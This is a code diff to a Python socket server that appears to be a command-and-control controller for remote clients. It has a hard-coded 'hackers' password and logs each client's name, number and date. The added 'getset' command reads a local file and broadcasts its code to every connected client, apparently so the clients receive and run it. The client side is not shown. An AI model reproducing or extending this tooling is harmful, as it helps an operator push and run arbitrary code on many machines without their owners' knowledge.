@@ -14,6 +14,7 @@ connect_list = []
 address_list = []
 name_list = []
 number_list = []
+date_list = []
 
 PASSWORT = "hackers"
 IP = None
@@ -40,7 +41,7 @@ STATUS = 0
 #	color 1
 #	color close
 #	getset start
-#	getset
+#	getset address
 #	exit
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
@@ -94,6 +95,7 @@ def printHelp(): # Command <help>
 	print("buffer")
 	print("password")
 	print("cls")
+	print("getset")
 
 def printList(): # Command <list>
 	print()
@@ -148,11 +150,17 @@ class ConnectUsersThread(threading.Thread): # ConnectUsersThread
 
 			name = connect.recv(1024)
 			number = connect.recv(1024)
+			date = connect.recv(1024)
 
 			connect_list.append(connect)
 			address_list.append(address)
+
 			name_list.append(name.decode("utf-8"))
 			number_list.append(number.decode("utf-8"))
+			date_list.append(date.decode("utf-8"))
+
+			
+
 
 			CONNECTS += 1
 			STATUS = 3
@@ -246,6 +254,29 @@ def exitCommand():
 def clsCommand():
 	system("cls")
 
+def getsetCommand():
+	global BUFFER_SIZE
+
+	print("________________GetSet________________")
+	sendCommandAllUsers("getset")
+
+	address = str(input("Enter address file for <GetSet User>: "))
+	sendCommandAllUsers(address)
+
+	address = str(input("Enter address file for <GetSet Server>: "))
+
+
+	BUFFER_SIZE = int(input("Enter new BUFFER_SIZE (byte): "))
+	sendCommandAllUsers(str(BUFFER_SIZE))
+
+	f = open(address, 'r')
+	str_code = str(f.read())
+	f.close()
+
+	print("Send <code> (", address, ") .........")
+	sendCommandAllUsers(str_code.encode("utf-8"))
+	print("Successfully!")
+
 
 def interface():
 	
@@ -283,6 +314,9 @@ def interface():
 				bufferCommand()
 		elif command == 'cls':
 			clsCommand()
+		elif command == 'getset':
+			if login() == 1234:
+				getsetCommand()
 		elif not command:
 			print("You not enter command!")
 			continue
